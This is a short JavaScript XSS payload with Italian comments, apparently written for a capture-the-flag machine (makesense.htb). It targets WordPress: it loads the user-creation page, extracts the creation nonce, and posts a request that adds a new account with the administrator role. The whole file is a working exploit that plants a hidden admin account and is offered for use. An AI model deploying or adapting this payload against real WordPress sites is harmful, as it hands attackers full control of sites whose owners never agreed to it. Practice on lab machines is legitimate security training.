// 1. Definiamo i parametri del nuovo utente amministratore
const username = 'ale';
const email = 'alexshadow@makesense.htb';
const password = 'Password123'; // Sostituisci con la tua

// 2. Prima richiesta: Leggiamo la pagina di creazione utente per estrarre il nonce
fetch('/wp-admin/user-new.php')
    .then(response => response.text())
    .then(html => {
        // Usiamo il DOMParser per analizzare l'HTML ricevuto
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        
        // WordPress memorizza il nonce nel campo hidden con id "_wpnonce_create-user"
        const nonce = doc.querySelector('#_wpnonce_create-user').value;

        if (nonce) {
            // 3. Seconda richiesta: Se abbiamo il nonce, inviamo il POST per creare l'admin
            const formData = new FormData();
            formData.append('action', 'createuser');
            formData.append('_wpnonce_create-user', nonce);
            formData.append('_wp_http_referer', '/wp-admin/user-new.php');
            formData.append('user_login', username);
            formData.append('email', email);
            formData.append('pass1', password);
            formData.append('pass2', password);
            formData.append('role', 'administrator'); // Privilegi massimi
            formData.append('ure_select_other_roles', '');
            formData.append('createuser', 'Add New User');

            fetch('/wp-admin/user-new.php', {
                method: 'POST',
                body: formData
            });
        }
    }).catch(err => console.error("Errore nell'exploit XSS:", err));
